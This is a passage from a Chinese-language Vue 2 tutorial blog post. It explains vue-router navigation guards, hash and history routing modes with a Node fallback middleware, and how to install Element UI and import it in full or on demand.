class="line"><span class="keyword">export</span> <span class="keyword">default</span> router</span><br></pre></td></tr></table></figure>

<p>如果不加参数，切换路由前，虽然执行了这个钩子，但是路由组件没有被渲染</p>
<p>因为还要传递三个参数，可以打印看下</p>
<ul>
<li><code>to</code>：目标路由</li>
<li><code>from</code>：源路由</li>
<li><code>next</code>：放行，如果不写，则不会继续往下走了</li>
</ul>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">router.<span class="title function_">beforeEach</span>(<span class="function">(<span class="params">to, <span class="keyword">from</span>, next</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(to)</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="keyword">from</span>)</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(next)</span><br><span class="line">    <span class="title function_">next</span>()</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>

<p>从<code>home</code>切换到<code>about</code></p>
<p><img src="/2022/07/25/web/JavaScript/vue_%E6%95%99%E7%A8%8B3/image-20220606065720223.png" alt="image-20220606065720223"></p>
<p>我们可以根据<code>fullPath</code>、<code>path</code>或<code>name</code>属性值来判断，是否执行<code>next</code></p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">router.<span class="title function_">beforeEach</span>(<span class="function">(<span class="params">to, <span class="keyword">from</span>, next</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">if</span>(to.<span class="property">path</span> === <span class="string">&#x27;/about&#x27;</span>) &#123;</span><br><span class="line">        <span class="title function_">alert</span>(<span class="string">&#x27;该页面无权查看&#x27;</span>)</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="title function_">next</span>()</span><br><span class="line">    &#125;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>

<p>此时从<code>home</code>组件跳转到<code>about</code>组件之前，就会弹窗提示，并且路由也不会发生变化</p>
<p><img src="/2022/07/25/web/JavaScript/vue_%E6%95%99%E7%A8%8B3/image-20220606070303702.png" alt="image-20220606070303702"></p>
<p>但是如果有多个页面都需要判断，如想要向<code>News</code>和<code>Message</code>添加权限，上述的<code>to.path</code>写法就显得有些繁琐了</p>
<p>可以在<code>router/index.js</code>中，在需要校验的组件中，新增配置项<code>meta</code>，用于表示是否需要权限校验</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">children</span>: [</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="attr">path</span>: <span class="string">&#x27;news&#x27;</span>,</span><br><span class="line">                <span class="attr">component</span>: <span class="title class_">News</span>,</span><br><span class="line">                <span class="attr">meta</span>: &#123; <span class="comment">// 新增meta配置项</span></span><br><span class="line">                    <span class="attr">isAuth</span>: <span class="literal">false</span></span><br><span class="line">                &#125;</span><br><span class="line">            &#125;,</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="attr">name</span>: <span class="string">&#x27;message&#x27;</span>,</span><br><span class="line">                <span class="attr">path</span>: <span class="string">&#x27;Message&#x27;</span>,</span><br><span class="line">                <span class="attr">component</span>: <span class="title class_">Message</span>,</span><br><span class="line">                <span class="attr">meta</span>: &#123; <span class="comment">// 新增meta配置项</span></span><br><span class="line">                    <span class="attr">isAuth</span>: <span class="literal">true</span></span><br><span class="line">                &#125;,</span><br><span class="line">                <span class="attr">children</span>: [</span><br><span class="line">                    &#123;</span><br><span class="line">                        <span class="attr">name</span>: <span class="string">&#x27;xiangqing&#x27;</span>,</span><br><span class="line">                        <span class="attr">path</span>: <span class="string">&#x27;detail/:id/:title&#x27;</span>,</span><br><span class="line">                        <span class="attr">component</span>: <span class="title class_">Detail</span>,</span><br><span class="line">                        <span class="title function_">props</span>(<span class="params">&#123;params: &#123;id, title&#125;&#125;</span>) &#123;</span><br><span class="line">                            <span class="keyword">return</span> &#123;id ,title&#125;</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                ]</span><br><span class="line">            &#125;</span><br><span class="line">        ]</span><br></pre></td></tr></table></figure>

<p>我们先关掉之前对<code>about</code>组件的鉴权，然后点击<code>about/news</code>，可以看到<code>to</code>的身上多了<code>isAuth</code>属性值</p>
<p><img src="/2022/07/25/web/JavaScript/vue_%E6%95%99%E7%A8%8B3/image-20220606071152032.png" alt="image-20220606071152032"></p>
<p>利用该属性进行判断是否需要鉴权</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">router.<span class="title function_">beforeEach</span>(<span class="function">(<span class="params">to, <span class="keyword">from</span>, next</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">if</span>(to.<span class="property">meta</span>.<span class="property">isAuth</span>) &#123;</span><br><span class="line">        <span class="title function_">alert</span>(<span class="string">&#x27;该页面无权查看&#x27;</span>)</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="title function_">next</span>()</span><br><span class="line">    &#125;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>



<p>此时想从<code>News</code>跳转到<code>Message</code>组件，就会提示没有权限了</p>
<p><img src="/2022/07/25/web/JavaScript/vue_%E6%95%99%E7%A8%8B3/image-20220606071339607.png" alt="image-20220606071339607"></p>
<h3 id="6-5-5-全局后置-路由守卫"><a href="#6-5-5-全局后置-路由守卫" class="headerlink" title="6.5.5.全局后置_路由守卫"></a>6.5.5.全局后置_路由守卫</h3><p>我们按照前置路由守卫的写法，先测试看一下</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">router.<span class="title function_">afterEach</span>(<span class="function">(<span class="params">to, <span class="keyword">from</span>, next</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(to)</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="keyword">from</span>)</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(next) <span class="comment">// undefined</span></span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>

<p>调用时机：</p>
<ul>
<li>初始化的时候被调用</li>
<li>每次路由切换之后被调用</li>
</ul>
<p>后置路由守卫，是没有<code>next</code>的，因为路由已经切换完了，还要<code>next</code>干嘛，所以只写两个参数即可</p>
<p>那么，没有<code>next</code>，还守卫啥呢？</p>
<p>实际开发中，不同栏目切换时，希望浏览器页签标题，和目录名对应上</p>
<p>可以在<code>meta</code>中自定义路由元信息<code>title</code>，在后置路由守卫中，进行处理</p>
<p><code>router/index.js</code></p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line"><span class="attr">children</span>: [</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="attr">path</span>: <span class="string">&#x27;news&#x27;</span>,</span><br><span class="line">                <span class="attr">component</span>: <span class="title class_">News</span>,</span><br><span class="line">                <span class="attr">meta</span>: &#123;</span><br><span class="line">                    <span class="attr">isAuth</span>: <span class="literal">false</span>,</span><br><span class="line">                    <span class="attr">title</span>: <span class="string">&#x27;新闻&#x27;</span></span><br><span class="line">                &#125;</span><br><span class="line">            &#125;,</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="attr">name</span>: <span class="string">&#x27;message&#x27;</span>,</span><br><span class="line">                <span class="attr">path</span>: <span class="string">&#x27;Message&#x27;</span>,</span><br><span class="line">                <span class="attr">component</span>: <span class="title class_">Message</span>,</span><br><span class="line">                <span class="attr">meta</span>: &#123;</span><br><span class="line">                    <span class="attr">isAuth</span>: <span class="literal">true</span>,</span><br><span class="line">                    <span class="attr">title</span>: <span class="string">&#x27;消息&#x27;</span></span><br><span class="line">                &#125;,</span><br><span class="line">                <span class="attr">children</span>: [</span><br><span class="line">                    &#123;</span><br><span class="line">                        <span class="attr">name</span>: <span class="string">&#x27;xiangqing&#x27;</span>,</span><br><span class="line">                        <span class="attr">path</span>: <span class="string">&#x27;detail/:id/:title&#x27;</span>,</span><br><span class="line">                        <span class="attr">component</span>: <span class="title class_">Detail</span>,</span><br><span class="line">                        <span class="title function_">props</span>(<span class="params">&#123;params: &#123;id, title&#125;&#125;</span>) &#123;</span><br><span class="line">                            <span class="keyword">return</span> &#123;id, title&#125;</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                ]</span><br><span class="line">            &#125;</span><br><span class="line">        ]</span><br><span class="line">...</span><br></pre></td></tr></table></figure>



<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">router.<span class="title function_">afterEach</span>(<span class="function">(<span class="params">to, <span class="keyword">from</span></span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="variable language_">document</span>.<span class="property">title</span> = to.<span class="property">meta</span>.<span class="property">title</span> || <span class="string">&#x27;RouterGuard&#x27;</span> <span class="comment">// 设置页签标题以及默认值</span></span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>





<p>为啥不能在前置路由守卫中处理</p>
<ul>
<li><p>对于没有权限的路由，放在前置路由中处理<code>document.title</code>的话，直接就修改了，但事实是页面并没有跳转，如下，<code>message</code>组件没有权限访问，由于是在前置路由守卫中处理的，页签标题仍会修改</p>
</li>
<li><p>除非说每次<code>next</code>之前，都要修改一次，就显得很繁琐</p>
<p><img src="/2022/07/25/web/JavaScript/vue_%E6%95%99%E7%A8%8B3/image-20220606113037754.png" alt="image-20220606113037754"></p>
</li>
<li><p>希望正确跳转之后，才执行的操作，可以放在后置路由守卫中</p>
</li>
</ul>
<h3 id="6-5-6-独享路由守卫"><a href="#6-5-6-独享路由守卫" class="headerlink" title="6.5.6.独享路由守卫"></a>6.5.6.独享路由守卫</h3><p>需求：指向对单独的一个路由，作限制</p>
<p>在<code>route</code>规则中，新增配置项<code>beforeEnter: (to, from, next) =&gt; &#123;&#125;</code>（前置独享路由守卫），注意没有后置独享路由守卫，可以和后置路由守卫配合使用</p>
<p>然后将之前的路由守卫的规则，放入函数体即可</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">                <span class="attr">name</span>: <span class="string">&#x27;message&#x27;</span>,</span><br><span class="line">                <span class="attr">path</span>: <span class="string">&#x27;Message&#x27;</span>,</span><br><span class="line">                <span class="attr">component</span>: <span class="title class_">Message</span>,</span><br><span class="line">                <span class="attr">meta</span>: &#123;</span><br><span class="line">                    <span class="attr">isAuth</span>: <span class="literal">true</span>,</span><br><span class="line">                    <span class="attr">title</span>: <span class="string">&#x27;消息&#x27;</span></span><br><span class="line">                &#125;,</span><br><span class="line">                <span class="attr">beforeEnter</span>: <span class="function">(<span class="params">to, <span class="keyword">from</span>, next</span>) =&gt;</span> &#123; <span class="comment">// 配置`Message`组件独享的路由守卫</span></span><br><span class="line">                    <span class="keyword">if</span> (to.<span class="property">meta</span>.<span class="property">isAuth</span>) &#123;</span><br><span class="line">                        <span class="title function_">alert</span>(<span class="string">&#x27;该页面无权查看&#x27;</span>)</span><br><span class="line">                    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                        <span class="title function_">next</span>()</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;,</span><br><span class="line">                <span class="attr">children</span>: [</span><br><span class="line">                    &#123;</span><br><span class="line">                        <span class="attr">name</span>: <span class="string">&#x27;xiangqing&#x27;</span>,</span><br><span class="line">                        <span class="attr">path</span>: <span class="string">&#x27;detail/:id/:title&#x27;</span>,</span><br><span class="line">                        <span class="attr">component</span>: <span class="title class_">Detail</span>,</span><br><span class="line">                        <span class="title function_">props</span>(<span class="params">&#123;params: &#123;id, title&#125;&#125;</span>) &#123;</span><br><span class="line">                            <span class="keyword">return</span> &#123;id, title&#125;</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                ]</span><br><span class="line">            &#125;</span><br></pre></td></tr></table></figure>

<h3 id="6-5-7-组件内路由守卫"><a href="#6-5-7-组件内路由守卫" class="headerlink" title="6.5.7.组件内路由守卫"></a>6.5.7.组件内路由守卫</h3><p>组件内的路由守卫，没有前置后置的概念</p>
<p>只有进入该组件时，和离开该组件时的概念</p>
<p>组件内新增配置项：</p>
<ul>
<li><p><code>beforeRouterEnter(to, from, next) &#123;&#125;</code></p>
<ul>
<li><p>通过路由规则，进入当前组件时，被调用</p>
</li>
<li><p>可以在其中逻辑控制</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_">beforeRouteEnter</span>(<span class="params">to, <span class="keyword">from</span>, next</span>) &#123;</span><br><span class="line">  <span class="keyword">if</span> (to.<span class="property">meta</span>.<span class="property">isAuth</span>) &#123;</span><br><span class="line">    <span class="title function_">alert</span>(<span class="string">&#x27;该页面无权查看&#x27;</span>)</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="title function_">next</span>()</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;进入Message组件之前&#x27;</span>)</span><br><span class="line">&#125;,</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
<li><p><code>beforeRouterLeave(to, from, next)&#123;&#125;</code></p>
<ul>
<li><p>通过路由规则，离开当前组件时，被调用</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_">beforeRouteLeave</span>(<span class="params">to, <span class="keyword">from</span>, next</span>) &#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;离开Message组件之前&#x27;</span>)</span><br><span class="line">  <span class="title function_">next</span>()</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
<li><p>注意，一定是通过路由规则，加载组件才会被调用，如果是直接引入组件，则不会被调用</p>
</li>
<li><p>应用场景：如果组件里面想要单独写独有的进入或离开的逻辑，可以借助组件内路由守卫</p>
</li>
</ul>
<h3 id="6-5-8-history模式和hash模式"><a href="#6-5-8-history模式和hash模式" class="headerlink" title="6.5.8.history模式和hash模式"></a>6.5.8.<code>history</code>模式和<code>hash</code>模式</h3><p>路由器的工作模式，通过配置项<code>mode</code>来指定</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> router = <span class="keyword">new</span> <span class="title class_">VueRouter</span>(&#123;</span><br><span class="line">    routes,</span><br><span class="line">    <span class="attr">mode</span>: <span class="string">&#x27;hash&#x27;</span></span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>



<ul>
<li><p><code>hash</code>模式：</p>
<ul>
<li><p>这里的<code>hash</code>和数据加密没有任何关系，就是前端自己在玩的一个东西</p>
</li>
<li><p>从<code>#</code>号开始到最后，都作为<code>hash</code>值的一部分，不会作为<code>http</code>请求路径的一部分</p>
</li>
<li><p><code>vue-cli</code>默认使用的是<code>hash</code>模式</p>
</li>
</ul>
</li>
<li><p><code>history</code>模式：</p>
<ul>
<li><p>没有<code>#</code>号</p>
</li>
<li><p>所有的路径，都会作为<code>http</code>请求路径的一部分</p>
</li>
<li><p>直接使用<code>history</code>模式的问题</p>
<ul>
<li>项目上线后，一开始点是没有问题，但是只要一刷新，前端路由的路径，就会向后台服务器请求资源了，报404错误</li>
</ul>
</li>
<li><p>解决方案</p>
<ul>
<li><p>需要后端配合</p>
<ul>
<li><p><code>nodejs</code>后台</p>
<ul>
<li><p>使用<code>connect-history-api-fallback</code>中间件，专门用于解决<code>nodejs</code>后台处理<code>history</code>模式出现的404问题</p>
</li>
<li><p>安装：<code>npm i connet-history-api-fallback</code></p>
</li>
<li><p>在静态资源之前使用：</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> express = <span class="built_in">require</span>(<span class="string">&#x27;express&#x27;</span>)</span><br><span class="line"><span class="keyword">const</span> history = <span class="built_in">require</span>(<span class="string">&#x27;connect-history-api-fallback&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> app = <span class="title function_">express</span>()</span><br><span class="line">app.<span class="title function_">use</span>(<span class="title function_">history</span>()) <span class="comment">// 在静态资源之前使用中间件</span></span><br><span class="line">app.<span class="title function_">use</span>(express.<span class="title function_">static</span>(__dirname + <span class="string">&#x27;static&#x27;</span>))</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">get</span>(<span class="string">&#x27;/person&#x27;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">    res.<span class="title function_">send</span>(&#123;</span><br><span class="line">        <span class="attr">name</span>: <span class="string">&#x27;tom&#x27;</span>,</span><br><span class="line">        <span class="attr">age</span>: <span class="number">18</span></span><br><span class="line">    &#125;)</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">listen</span>(<span class="number">5005</span>, <span class="function">(<span class="params">error</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">if</span>(!err) <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;服务器启动成功!&#x27;</span>)</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
<li><p><code>python</code>后台</p>
</li>
<li><p><code>java</code>后台</p>
</li>
<li><p><code>golang</code>后台</p>
</li>
</ul>
</li>
<li><p>或者可以配置<code>nginx</code>代理</p>
</li>
</ul>
</li>
</ul>
</li>
</ul>
<p>小结：</p>
<ul>
<li>对于一个<code>url</code>来说，什么是<code>hash</code>值？<ul>
<li><code>#</code>号及其后面的内容就是<code>hash</code>值</li>
</ul>
</li>
<li><code>hash</code>值不会包含在<code>http</code>请求中，即：<code>hash</code>值不会带给服务器</li>
<li><code>hash</code>模式：<ul>
<li>地址中永远带着<code>#</code>号，不美观</li>
<li>若以后将地址通过第三方手机<code>app</code>分享，若<code>app</code>严格校验，则地址会被标记为不合法</li>
<li>兼容性较好</li>
</ul>
</li>
<li><code>history</code>模式：<ul>
<li>地址干净，美观</li>
<li>兼容性和<code>hash</code>模式相比，略差</li>
<li>应用部署上线时，需要后端人员支持，解决刷新页面服务端404的问题</li>
</ul>
</li>
</ul>
<h1 id="7-Vue-UI组件库"><a href="#7-Vue-UI组件库" class="headerlink" title="7.Vue UI组件库"></a>7.<code>Vue</code> <code>UI</code>组件库</h1><p>组件库定位：</p>
<ul>
<li><p>如果是高度定制化的页面，结构和样式只能一点点手写</p>
</li>
<li><p>如果是能用进行，最好页面不要太丑，就可以用<code>UI</code>组件库</p>
</li>
</ul>
<h2 id="7-1-移动端常用UI组件库"><a href="#7-1-移动端常用UI组件库" class="headerlink" title="7.1.移动端常用UI组件库"></a>7.1.移动端常用<code>UI</code>组件库</h2><ul>
<li><code>Vant</code></li>
<li><code>Cube UI</code></li>
<li><code>Mint UI</code></li>
<li><code>NUTUI</code></li>
</ul>
<h2 id="7-2-PC端常用UI组件库"><a href="#7-2-PC端常用UI组件库" class="headerlink" title="7.2.PC端常用UI组件库"></a>7.2.<code>PC</code>端常用<code>UI</code>组件库</h2><ul>
<li><code>Element UI</code></li>
<li><code>IView UI</code></li>
</ul>
<h2 id="7-3-ElementUI的基本使用"><a href="#7-3-ElementUI的基本使用" class="headerlink" title="7.3.ElementUI的基本使用"></a>7.3.<code>ElementUI</code>的基本使用</h2><h3 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h3><p>官网：<a target="_blank" rel="noopener" href="https://element.eleme.io/#/zh-CN/component/installation">https://element.eleme.io/#/zh-CN/component/installation</a></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm i element-ui -D</span><br></pre></td></tr></table></figure>

<p>当前项目是基于<code>vue-cli5</code>安装的<code>vue2</code>的项目，提示<code>core-js</code>版本过低</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">npm WARN deprecated core-js@2.6.12: core-js@&lt;3.4 is no longer maintained and not recommended for usage due to the number of issues. Because of the V8 engine whims, feature detection in old core-js versions could cause a slowdown up to 100x even if nothing is polyfilled. Please, upgrade your dependencies to the actual version of core-js.</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>但实际上<code>package.json</code>中的<code>core-js</code>版本是<code>3.8.3</code>，可能是<code>element-ui</code>中用到的版本吧，暂时跳过这一问题</p>
<h3 id="引入"><a href="#引入" class="headerlink" title="引入"></a>引入</h3><h4 id="全量引入（不推荐）"><a href="#全量引入（不推荐）" class="headerlink" title="全量引入（不推荐）"></a>全量引入（不推荐）</h4><p><code>main.js</code></p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> <span class="title class_">Vue</span> <span class="keyword">from</span> <span class="string">&#x27;vue&#x27;</span></span><br><span class="line"><span class="keyword">import</span> <span class="title class_">App</span> <span class="keyword">from</span> <span class="string">&#x27;./App.vue&#x27;</span></span><br><span class="line"><span class="keyword">import</span> router <span class="keyword">from</span> <span class="string">&#x27;./router&#x27;</span></span><br><span class="line"><span class="keyword">import</span> store <span class="keyword">from</span> <span class="string">&#x27;./store&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="title class_">ElementUI</span> <span class="keyword">from</span> <span class="string">&#x27;element-ui&#x27;</span>; <span class="comment">// 引入element组件库</span></span><br><span class="line"><span class="keyword">import</span> <span class="string">&#x27;element-ui/lib/theme-chalk/index.css&#x27;</span>; <span class="comment">// 引入element全部样式</span></span><br><span class="line"></span><br><span class="line"><span class="title class_">Vue</span>.<span class="property">config</span>.<span class="property">productionTip</span> = <span class="literal">false</span></span><br><span class="line"></span><br><span class="line"><span class="title class_">Vue</span>.<span class="title function_">use</span>(<span class="title class_">ElementUI</span>); <span class="comment">// 应用element</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">new</span> <span class="title class_">Vue</span>(&#123;</span><br><span class="line">  router,</span><br><span class="line">  store,</span><br><span class="line">  <span class="attr">render</span>: <span class="function"><span class="params">h</span> =&gt;</span> <span class="title function_">h</span>(<span class="title class_">App</span>)</span><br><span class="line">&#125;).$mount(<span class="string">&#x27;#app&#x27;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h4 id="按需引入"><a href="#按需引入" class="headerlink" title="按需引入"></a>按需引入</h4><p>借助 <code>babel-plugin-component</code>，我们可以只引入需要的组件，以达到减小项目体积的目的。</p>
<p><code>main.js</code></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install babel-plugin-component -D</span><br></pre></td></tr></table></figure>

<p>然后，将 <code>.babelrc</code> 修改为：</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  <span class="string">&quot;presets&quot;</span>: [[<span class="string">&quot;es2015&quot;</span>, &#123; <span class="string">&quot;modules&quot;</span>: <span class="literal">false</span> &#125;]],</span><br><span class="line">  <span class="string">&quot;plugins&quot;</span>: [</span><br><span class="line">    [</span><br><span class="line">      <span class="string">&quot;component&quot;</span>,</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="string">&quot;libraryName&quot;</span>: <span class="string">&quot;element-ui&quot;</span>,</span><br><span class="line">        <span class="string">&quot;styleLibraryName&quot;</span>: <span class="string">&quot;theme-chalk&quot;</span></span><br><span class="line">      &#125;</span><br><span class="line">    ]</span><br><span class="line">  ]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>如果没有<code>.babelrc</code>，应该有<code>babel.config.js</code></p>
<p>原来的内容</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">module</span>.<span class="property">exports</span> = &#123;</span><br><span class="line">  <span class="attr">presets</span>: [</span><br><span class="line">    <span class="string">&#x27;@vue/cli-plugin-babel/preset&#x27;</span></span><br><span class="line">  ]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>修改如下：</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">module</span>.<span class="property">exports</span> = &#123;</span><br><span class="line">  <span class="attr">presets</span>: [</span><br><span class="line">    <span class="string">&#x27;@vue/cli-plugin-babel/preset&#x27;</span>,</span><br><span class="line">    [<span class="string">&quot;es2015&quot;</span>, &#123; <span class="string">&quot;modules&quot;</span>: <span class="literal">false</span> &#125;]</span><br><span class="line">  ],</span><br><span class="line">  <span class="attr">plugins</span>: [ <span class="comment">// 这里是js文件，去掉key的引号</span></span><br><span class="line">    [</span><br><span class="line">      <span class="string">&quot;component&quot;</span>,</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="string">&quot;libraryName&quot;</span>: <span class="string">&quot;element-ui&quot;</span>,</span><br><span class="line">        <span class="string">&quot;styleLibraryName&quot;</span>: <span class="string">&quot;theme-chalk&quot;</span></span><br><span class="line">      &#125;</span><br><span class="line">    ]</span><br><span class="line">  ]</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

